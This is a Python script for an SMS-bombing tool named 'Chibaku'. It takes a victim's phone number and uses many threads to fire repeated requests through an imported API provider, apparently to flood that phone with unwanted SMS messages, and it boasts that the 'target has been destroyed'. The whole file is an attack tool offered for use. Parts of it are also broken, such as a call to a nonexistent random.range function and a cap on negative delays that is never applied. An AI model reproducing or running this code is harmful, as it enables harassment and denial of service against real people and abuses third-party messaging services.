import os, sys, string, random,  time
from concurrent.futures import ThreadPoolExecutor, as_completed
from runs.prov import APIProvider


def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def logo():
    clear()
    logo = """
 ▄████████    ▄█    █▄     ▄█  ▀█████████▄     ▄████████    ▄█   ▄█▄ ███    █▄  
███    ███   ███    ███   ███    ███    ███   ███    ███   ███ ▄███▀ ███    ███ 
███    █▀    ███    ███   ███▌   ███    ███   ███    ███   ███▐██▀   ███    ███ 
███         ▄███▄▄▄▄███▄▄ ███▌  ▄███▄▄▄██▀    ███    ███  ▄█████▀    ███    ███ 
███        ▀▀███▀▀▀▀███▀  ███▌ ▀▀███▀▀▀██▄  ▀███████████ ▀▀█████▄    ███    ███ 
███    █▄    ███    ███   ███    ███    ██▄   ███    ███   ███▐██▄   ███    ███ 
███    ███   ███    ███   ███    ███    ███   ███    ███   ███ ▀███▄ ███    ███ 
████████▀    ███    █▀    █▀   ▄█████████▀    ███    █▀    ███   ▀█▀ ████████▀  
                                                           ▀                    
    """
    Dev = "Created By DORTROX"
    print(logo)
    print(Dev)


def get_phone_info():
    while True:
        target = ""
        target = input("Enter the Phone Number: ")
        if ((len(target) <= 6) or (len(target) > 10)):
            print(f"The phone number {target} that you have entered is invalid")
            continue
        return (target)

def realTprint(target, Success, failed):
    logo()
    requested = Success+failed
    message = "On Progress - Please be patient\n"
    message += f"Target          : {target}\n"
    message += f"Sent            : {requested}\n"
    message += f"Successful      : {Success}\n"
    message += f"Failed          : {failed}\n\n"
    message += "Created for flexing\n"
    message += "Chibaku was created by DORTROX"
    print(message)


def workernode(target, count, delay, max_threads):

    logo()
    api = APIProvider(target, delay=delay)
    message = "Gearing up on target\n"
    message += f"Target          : {target}\n"
    message += f"Amount          : {count}\n"
    message += f"Threads         : {max_threads}\n"
    message += f"Delay           : {delay} seconds\n\n"
    message += "Target will now experience the troll"
    print(message)

    Success, failed = 0, 0
    while Success < count:
        with ThreadPoolExecutor(max_workers= max_threads) as executor:
            jobs = []
            for i in range(count-Success):
                jobs.append(executor.submit(api.hit))
            
            for job in as_completed(jobs):
                result = job.result()
                if result is None:
                    print("Error")
                    sys.exit()
                if result:
                    Success +=1
                else:
                    failed += 1
                realTprint(target, Success, failed)
    print("\nTarget has been destroyed")
    time.sleep(1.5)
    logo()


logo()
max_limit = 500
target  = get_phone_info()
while True:
    try:
        count = int(input("Emter the amount of sms to send: "))
        if count > max_limit or count == 0:
            print(f"You have requested {count}\nAutomatically capping the value: ")
            count = random.range(500)
        delay = float(input("Enter delay time ( in seconds ): "))
        if delay < 0:
            print("You delay request {count} is below 0\nAutomatically capping the value: ")
        max_thread_limit = (count//10) if (count//10) > 0 else 1
        max_threads = int(input(f"Enter No of threads ( Recommended: {max_thread_limit}): "))
        break
    except:
        pass

workernode(target, count, delay, max_threads)